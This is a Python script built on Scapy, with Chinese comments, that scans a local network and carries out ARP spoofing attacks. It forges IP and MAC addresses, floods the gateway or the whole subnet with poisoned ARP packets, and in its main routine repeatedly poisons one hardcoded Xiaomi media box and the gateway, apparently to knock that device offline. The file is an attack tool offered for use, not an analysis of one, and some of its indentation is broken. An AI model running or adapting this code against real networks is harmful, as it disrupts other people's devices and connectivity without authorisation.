#!/usr/bin/env python
# coding: utf-8


from scapy.all import *
import time
import random
#-------------------------------------------------------

def GetSubNet(OurIP):
    '''
    获取子网，192.168.0
    '''
    Index = 0
    SubString = ""
    while True:
        num = OurIP.find('.',Index)
        if num != -1:
            Index = num + 1
        if num == -1:
            SubString = OurIP[:Index]
            break
    return SubString
#-------------------------------------------------------
def GetMac(tgtIP):
    '''
    获取目标IP的MAC地址。
    tgtIP:目标IP地址
    '''
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print (tgtIP,"请检查目标IP是否存活")
#-------------------------------------------------------

def GetBrocastIP(OurIP):
    '''
    获取局域网广播地址
    OurIP :我们的IP地址
    '''
    return GetSubNet(OurIP) + "255"
#-------------------------------------------------------

def GetForgetIP(OurIP,Num):
    '''
    伪造IP地址
    OurIP:我们自己的IP
    Num:要伪造多少个IP地址
    '''
    SubString = GetSubNet(OurIP)
    #伪造IP
    ForgetIP = []
    i = 0
    while i < Num:
        num = int(random.uniform(0,255))
        TempIP = SubString + "%d"%num
        if TempIP == OurIP:
            continue
        else:
            ForgetIP.append(TempIP)
            i = i + 1
    return ForgetIP
#-------------------------------------------------------

def GetForgeMac(OurMac,Num):
    '''
    生成随机MAC地址
    OurMac:我们自己的MAC地址，不能跟自己重复啊
    '''
    ForgeMac = []
    j = 0
    while j < Num:
        while True:
             i = 0
            TempMac = ""
            while i < 6:
                num = int(random.uniform(0,255))
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                    i = i + 1
            if TempMac == OurMac:
                pass
            else:
                ForgeMac.append(TempMac)
                j = j + 1
                break
    return ForgeMac
#-------------------------------------------------------

def AttackMac(Mac,face,Num,Interval,GW_IP):
    '''
    攻击MAC
    Mac:要攻击的MAC地址
    face:发送攻击报文的网络接口
    GW:是否只攻击网关
    '''
    Broadcast_mac = "FF:FF:FF:FF:FF:FF"
    GW_MAC = ""
    try:
        OurIP = get_if_addr(face)
        if GW_IP != "":GW_MAC = GetMac(GW_IP)
    except:
        OurIP = "192.168.0.105"
        return
    Broadcast_ip = GetBrocastIP(OurIP)
    while True:
         ForgeIP = GetForgetIP(OurIP,Num)
         #生成数据包
         if GW_IP != "":
             #攻击网关
             pkt = Ether(dst = GW_MAC,src = Mac)/\
             ARP(psrc = ForgeIP,pdst = GW_IP,\
             hwsrc = Mac,hwdst = GW_MAC,op = 2)
         else:
             #攻击全网
             pkt = Ether(dst = Broadcast_mac,src = Mac)/\
             ARP(psrc = ForgeIP,pdst = Broadcast_ip,\
             hwsrc = Mac,op = 1)
         #发送数据包
         try:
             #print(ls(pkt))
             #input()
             sendp(pkt,iface = face)
         except:
             print("!!Send Error!!")
             break
         time.sleep(float(Interval))
#-------------------------------------------------------

def AttackIP(tgtIP,face,Num,Interval,GW_IP):
    '''
    攻击IP地址
    tgtIP：目标IP
    face：网卡接口
    Num：攻击报文数目
    Interval：攻击间隔
    '''
    #广播地址
    GW_MAC = ""
    Broadcast_mac = "FF:FF:FF:FF:FF:FF"
    #本地
    try:
        OurMac = get_if_hwaddr(face)
        OurIP = get_if_addr(face)
        if GW_IP != "":GW_MAC = GetMac(GW_IP)
    except:
        OurMac = "00:00:00:00:00:00"
        OurIP = "192.168.0.105"
    Broadcast_ip = GetBrocastIP(OurIP)
    while True:
        #准备数据包
        ForgeMac = GetForgeMac(OurMac,Num)
        if GW_IP != "":
            #攻击网关
            pkt = Ether(dst = GW_MAC,src = ForgeMac)/\
            ARP(psrc = tgtIP,pdst = GW_IP,\
            hwsrc = ForgeMac,hwdst = GW_MAC,op = 2)
        else:
            #攻击全网
            pkt = Ether(dst = Broadcast_mac,src = ForgeMac)/\
            ARP(psrc = tgtIP,pdst = Broadcast_ip,\
            hwsrc = ForgeMac,op = 1)
        #发送数据包
        try:
            sendp(pkt,iface = face)
        except:
            print("!!Send Error!!")
            break
        #延迟
        time.sleep(float(Interval))
#-------------------------------------------------------

Table = {}
def Scanf(OurIP,Start,End):
    '''
    扫描网络，获取IP-MAC并保存
    OurIP：我们的IP地址
    Start：扫描起始地址
    End：扫描结束地址
    例如：OurIP = 192.168.0.105，Start = 99，End = 150
    扫描IP范围：192.168.0.99 ~ 192.168.0.150
    '''
    SubString = GetSubNet(OurIP)
    for num in range(Start,End):
        ip = SubString+str(num)
        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        res = srp1(arpPkt, timeout = 1, verbose=0)
        if res:
            Table[res.psrc] = res.hwsrc
    return Table
#-------------------------------------------------------

def GetIpByMac(Mac):
    if len(Table) == 0:return None
    return Table.get(Mac)

def Attack_xiaomi(Face,PackNum,Counter,Interval):
    '''
    攻击小米盒子
    Face:网卡接口
    PackNum:数据包数目
    Counter:攻击次数(-1：无限次)
    Interval:攻击间隔
    例如：Face="wlan0",PackNum=10,Counter=-1,Interval=1
    '''
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    if MY_ip == None or MY_mac == None:return

    GW_ip = "192.168.0.1"
    GW_mac = GetMac(GW_ip)
    if GW_mac == None:return

    Scanf(MY_ip,99,150)

    XM_mac = "04:E6:76:46:A6:F3"
    XM_ip = GetIpByMac(XM_mac)
    if XM_ip == None:return

    while True:
        #Attack packs
        Temp_mac = GetForgeMac(MY_mac,PackNum)
        Temp_ip = GetForgetIP(MY_ip,PackNum)

        PKT_2_XM_4_mac = Ether(src = GW_mac,dst = XM_mac)/ARP(psrc = Temp_ip,pdst = XM_ip,op = 2)
        PKT_2_XM_4_ip = Ether(src = Temp_mac,dst = XM_mac)/ARP(psrc = GW_ip,pdst = XM_ip,op = 2)
        PKT_2_GW_4_XM_mac = Ether(src = XM_mac,dst = GW_mac)/ARP(psrc = Temp_ip,pdst = GW_ip,op = 2)
        PKT_2_GW_4_XM_ip = Ether(src = Temp_mac,dst = GW_mac)/ARP(psrc = XM_ip,pdst = GW_ip,op = 2)
        try:
            sendp(PKT_2_XM_4_mac,iface = Face)
            time.sleep(0.5)
            sendp(PKT_2_XM_4_ip,iface = Face)
            time.sleep(0.5)
            sendp(PKT_2_GW_4_XM_mac,iface = Face)
            time.sleep(0.5)
            sendp(PKT_2_GW_4_XM_ip,iface = Face)
        except:
            print("!!Send Error!!")
        #sleep
        num = int(random.uniform(0,Interval))
        time.sleep(num)
        if Counter == -1:
            pass
        else:
            Counter = Counter - 1
            if Counter == 0:
                return

if __name__ == "__main__":
    #while True:
    #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
    #AttackMac(Mac,face,Num,Interval,GW_IP):
    #AttackMac("C8:3A:35:C0:05:15","wlan0",2,2,"192.168.0.108")
    while True:
        Attack_xiaomi("wlan0",20,30,5)
